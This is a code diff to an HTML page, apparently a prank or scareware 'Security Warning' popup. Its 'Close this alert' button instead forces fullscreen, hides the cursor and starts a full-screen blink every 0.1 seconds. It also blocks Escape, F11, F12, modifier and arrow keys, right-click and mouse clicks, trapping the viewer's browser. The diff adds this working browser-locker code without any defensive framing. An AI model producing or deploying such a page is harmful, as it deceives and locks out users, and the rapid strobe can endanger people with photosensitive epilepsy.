@@ -2,16 +2,49 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>System Breach</title>
+  <title>System Alert</title>
   <style>
     html, body {
       margin: 0;
       padding: 0;
       height: 100%;
-      background-color: red;
-      animation: blink 0.5s infinite alternate;
       overflow: hidden;
-      cursor: none;
+      background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+
+    #popup {
+      position: absolute;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -30%);
+      background: #111;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 20px red;
+    }
+
+    #popup button {
+      padding: 14px 28px;
+      background: #ff0000;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    #blinker {
+      display: none;
+      width: 100%;
+      height: 100%;
+      animation: blink 0.1s infinite alternate;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 999;
     }
 
     @keyframes blink {
@@ -23,22 +56,47 @@
   </style>
 </head>
 <body>
-  <script>
-    // Disable right click, keys, scroll
+
+<div id="popup">
+  <h2>⚠️ Security Warning</h2>
+  <p>If you want to close this alert,<br> please click the button below.</p>
+  <br>
+  <button onclick="startSimulation()">Close this alert</button>
+</div>
+
+<div id="blinker"></div>
+
+<script>
+  function startSimulation() {
+    const el = document.documentElement;
+    const req = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
+    if (req) req();
+
+    document.getElementById("popup").style.display = "none";
+    document.getElementById("blinker").style.display = "block";
+    document.body.style.cursor = "none";
+
+    // Max keyboard blocking
+    document.addEventListener("keydown", function(e) {
+      const blockedKeys = [
+        "Escape", "Esc","Enter", "F11", "F12", "Tab", "Alt", "Control", "Shift", "Meta",
+        "ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight",
+        "CapsLock", "ContextMenu", "Insert", "Home", "End",
+        "PageUp", "PageDown", "NumLock", "ScrollLock",
+        "PrintScreen", "Pause", "Delete", "Backspace", "Space" ,"Windows","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10",
+        
+      ];
+      if (blockedKeys.includes(e.key) || e.ctrlKey || e.altKey || e.metaKey) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }
+    });
+
     document.addEventListener("contextmenu", e => e.preventDefault());
-    document.addEventListener("keydown", e => e.preventDefault());
     document.addEventListener("mousedown", e => e.preventDefault());
+  }
+</script>
 
-    // Try fullscreen on first interaction
-    function requestFullScreen() {
-      const el = document.documentElement;
-      const request = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
-      if (request) request();
-    }
-
-    // Trigger on first move or click
-    window.addEventListener("mousemove", requestFullScreen, { once: true });
-    window.addEventListener("click", requestFullScreen, { once: true });
-  </script>
 </body>
 </html>
